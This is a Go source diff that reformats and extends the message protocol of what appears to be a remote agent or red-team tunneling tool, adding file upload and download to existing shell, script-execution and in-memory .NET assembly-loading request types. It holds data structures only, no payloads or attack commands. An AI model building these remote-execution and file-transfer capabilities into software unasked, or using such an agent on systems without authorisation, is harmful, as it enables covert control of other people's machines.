@@ -50,6 +50,10 @@ const (
 	MessageScriptLoadResponse
 	MessageAssemblyLoadRequest
 	MessageAssemblyLoadResponse
+	MessageFileUploadRequest
+	MessageFileUploadResponse
+	MessageFileDownloadRequest
+	MessageFileDownloadResponse
 )
 
 const (
@@ -139,12 +143,12 @@ type NetInterface struct {
 }
 
 type ShellRequestPacket struct {
-        CmdLine string
+	CmdLine string
 }
 
 type ShellResponsePacket struct {
-        Output string
-        Err    bool   // true if command returned non‑zero or exec failed
+	Output string
+	Err    bool // true if command returned non‑zero or exec failed
 }
 
 func (ni NetInterface) MarshalJSON() ([]byte, error) {
@@ -201,27 +205,49 @@ type ConnectRequestPacket struct {
 
 // script exec
 type ScriptLoadRequest struct {
-    Lang   string // "ps1" | "sh"
-    Script []byte // raw code (optionally compressed)
-    Args   string // optional command-line args
+	Lang   string // "ps1" | "sh"
+	Script []byte // raw code (optionally compressed)
+	Args   string // optional command-line args
 }
 
 type ScriptLoadResponse struct {
-    Output string
-    Err    bool
+	Output string
+	Err    bool
 }
 
 // .NET Loader
 type AssemblyLoadRequest struct {
-    DLL     []byte // raw PE bytes (optionally compressed)
-    Type    string // e.g. "MyName.Space.Program"
-    Method  string // static method
-    JSONArg string // optional JSON string arg
+	DLL     []byte // raw PE bytes (optionally compressed)
+	Type    string // e.g. "MyName.Space.Program"
+	Method  string // static method
+	JSONArg string // optional JSON string arg
 }
 
 type AssemblyLoadResponse struct {
-    Return string
-    Err    bool
+	Return string
+	Err    bool
+}
+
+// FileUploadRequest uploads a file to the agent
+type FileUploadRequest struct {
+	Path string
+	Data []byte // base64 encoded data
+}
+
+type FileUploadResponse struct {
+	Err       bool
+	ErrString string
+}
+
+// FileDownloadRequest downloads a file from the agent
+type FileDownloadRequest struct {
+	Path string
+}
+
+type FileDownloadResponse struct {
+	Data      []byte // base64 encoded data
+	Err       bool
+	ErrString string
 }
 
 // ConnectResponsePacket is the response to the ConnectRequestPacket and indicate if the connection can be established, and if a RST packet need to be sent
